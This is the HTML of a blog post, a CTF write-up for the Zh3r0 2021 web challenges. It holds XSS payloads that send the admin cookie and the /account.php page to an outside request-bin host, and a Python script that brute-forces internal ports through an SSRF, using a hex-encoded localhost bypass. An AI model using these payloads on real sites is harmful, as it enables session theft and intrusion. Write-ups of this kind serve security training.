+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:(<span class="function">()=&gt;</span>&#123;<span class="built_in">window</span>.location=<span class="string">`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net?<span class="subst">$&#123;<span class="built_in">document</span>.cookie&#125;</span>`</span>&#125;)()</span><br></pre></td></tr></table></figure>
+<p>So I just tried xss using as above <code>javascript:</code> scheme.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/5.png?raw=true"></p>
+<p>When I checked requestbin, Well was steal admin cookie. So I send a request to /account.php using the admin cookie.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store/6.png?raw=true"></p>
+<p>Nice I got the flag.</p>
+<blockquote>
+<p>FLAG : zh3r0{4dm1n_l0ves_0nly_0r1g1n4ls_br0}</p>
+</blockquote>
+<hr>
+<h2 id="Web-Original-Store-v2-xxx-pts"><a href="#Web-Original-Store-v2-xxx-pts" class="headerlink" title="(Web) Original Store v2 [xxx pts]"></a>(Web) Original Store v2 [xxx pts]</h2><blockquote>
+<p>The Original Store v2 challenge is steal document, not admin cookie on the user page /account.php using the Reflected XSS because set the httponly option on the cookie. I solved using the unintended exploit</p>
+</blockquote>
+<p>Original Store v2 is the same as Original Store. The difference is can not steal the admin cookie. Maybe Was set the <code>httponly</code> options..</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:(<span class="function">()=&gt;</span>&#123;fetch(<span class="string">&#x27;/account.php&#x27;</span>).then(<span class="function">(<span class="params">x</span>)=&gt;</span>x.text()).then(<span class="function">(<span class="params">x</span>)=&gt;</span>fetch(<span class="string">`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net?<span class="subst">$&#123;x&#125;</span>`</span>))&#125;)()</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Original%20Store%20V2/1.png?raw=true"></p>
+<blockquote>
+<p>FLAG : zh3r0{4dm1n_h4tes_car_st34l3rs_br0}</p>
+</blockquote>
+<hr>
+<h2 id="Web-Baby-SSRF-xxx-pts"><a href="#Web-Baby-SSRF-xxx-pts" class="headerlink" title="(Web) Baby SSRF [xxx pts]"></a>(Web) Baby SSRF [xxx pts]</h2><blockquote>
+<p>The Baby SSRF challenge is find a port using the brute forcing and enter the internal server ip:port</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in range(5000,10000)</span><br><span class="line"></span><br><span class="line">xD</span><br></pre></td></tr></table></figure>
+<p>The organizer provided the above hint. The hint is mean to make the port random for range 5000 to 10000. So first I should find the port using the brute forcing and send a url using the ssrf  vulnerability.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Baby%20SSRF/waf.png?raw=true"></p>
+<p>If you enter the localhost/127.0.0.1, You can check the filtering. But I can bypass 127.0.0.1 to 0x7f000001.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.zh3r0.cf:6969/request&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span>(<span class="params">s, e</span>):</span></span><br><span class="line">    <span class="keyword">global</span> localhost</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s,e):</span><br><span class="line">        data = &#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;http://0x7f000001:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)&#125;</span><br><span class="line">        res = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Learn about URL&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res <span class="keyword">and</span> <span class="string">&quot;Please dont try to heck me sir...&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag = res.split(<span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;zh3r0&#123;&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">                    log.info(<span class="string">&quot;The internal Server is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">                    log.info(<span class="string">&quot;The flag is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(s))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    log.info(<span class="string">&quot;Exploit&quot;</span>)</span><br><span class="line">    th1 = Thread(target=a, args=(<span class="number">8001</span>, <span class="number">9000</span>))</span><br><span class="line">    th2 = Thread(target=a, args=(<span class="number">9001</span>, <span class="number">10000</span>))</span><br><span class="line"></span><br><span class="line">    th1.start()</span><br><span class="line">    th2.start()</span><br></pre></td></tr></table></figure>
+<p>I wrote the above poc code.</p>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/Zh3r0%20CTF%202021/Baby%20SSRF/1.png?raw=true"></p>
+<p>I execute the poc code and I can see the flag.</p>
+<blockquote>
+<p>FLAG : zh3r0{SSRF_0r_wh4t3v3r_ch4ll3ng3}</p>
+</blockquote>
+<hr>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-sparta-100-pts"><span class="toc-number">1.</span> <span class="toc-text">(Web) sparta [100 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-bxss-100-pts"><span class="toc-number">2.</span> <span class="toc-text">(Web) bxss [100 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-strpos-and-substr-xxx-pts"><span class="toc-number">3.</span> <span class="toc-text">(Web) strpos and substr [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Original-Store-xxx-pts"><span class="toc-number">4.</span> <span class="toc-text">(Web) Original Store [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Original-Store-v2-xxx-pts"><span class="toc-number">5.</span> <span class="toc-text">(Web) Original Store v2 [xxx pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Baby-SSRF-xxx-pts"><span class="toc-number">6.</span> <span class="toc-text">(Web) Baby SSRF [xxx pts]</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&text=Zh3r0 CTF V2 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&is_video=false&description=Zh3r0 CTF V2 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Zh3r0 CTF V2 Write Up&body=Check out this article: http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&title=Zh3r0 CTF V2 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&name=Zh3r0 CTF V2 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/06/06/2021-06-05-Zh3r0-2021-CTF/&t=Zh3r0 CTF V2 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Jeongwon Jo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'https-pocas-kr';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
